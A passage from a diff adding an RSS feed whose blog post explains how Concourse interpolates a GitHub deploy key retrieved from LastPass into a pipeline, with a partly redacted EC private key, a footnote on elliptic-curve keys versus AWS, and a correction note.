+MHcCAQEEIMxcR2wlxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxqY/VyDTL
+AwEHoUQDQgAEmBUxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxjY98wOPVZ
+Ayz++1vHXODWeiC/CjNu7hOVaB682ZZfCw==
+-----END EC PRIVATE KEY-----
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Concourse, when passed the flag &lt;code&gt;... -v github_deployments_key=&amp;quot;$(lpass show
+--note github_deployments_key)&amp;quot;&lt;/code&gt; will interpolate this section of
+&lt;code&gt;pipeline.yml&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;type: git
+source:
+  uri: git@github.com:cunnie/deployments.git
+  private_key: ((github_deployments_key))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After interpolation, the pipeline looks like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;- name: cunnie-deployments
+  type: git
+  source:
+    uri: git@github.com:cunnie/deployments.git
+    # previously: private_key: ((github_deployments_key))
+    private_key: |
+      -----BEGIN EC PRIVATE KEY-----
+      MHcCAQEEIMxcR2wlxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxqY/VyDTL
+      AwEHoUQDQgAEmBUxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxjY98wOPVZ
+      Ayz++1vHXODWeiC/CjNu7hOVaB682ZZfCw==
+      -----END EC PRIVATE KEY-----
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If your pipeline is not public, it may be easier to skip variable interpolation
+and embed the credential(s) directly.&lt;/p&gt;
+
+&lt;p&gt;&lt;a name=&#34;ECC&#34;&gt;&lt;sup&gt;[Elliptic-curve]&lt;/sup&gt;&lt;/a&gt;We use &lt;a href=&#34;https://en.wikipedia.org/wiki/Elliptic-curve_cryptography&#34;&gt;elliptic-curve
+cryptography&lt;/a&gt; (ECC)
+keys, for they are much shorter than an RSA key of &lt;a href=&#34;https://www.globalsign.com/en/blog/elliptic-curve-cryptography/&#34;&gt;equivalent
+strength&lt;/a&gt;, and
+thus more manageable. Unfortunately, they are not universally accepted (e.g. AWS
+will respond with &amp;ldquo;Error importing Key Pair Key is not in valid OpenSSH public
+key format&amp;rdquo; when importing an EC public key).&lt;/p&gt;
+
+&lt;p&gt;Where elliptic-curve cryptography is concerned, GitHub is ahead of the
+proverbial curve, and AWS, behind.&lt;/p&gt;
+
+&lt;h2 id=&#34;corrections-updates&#34;&gt;Corrections &amp;amp; Updates&lt;/h2&gt;
+
+&lt;p&gt;&lt;em&gt;2017-11-25&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;David McClure pointed out that the OpenStack link was missing; it has been
+added. Thanks, David.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
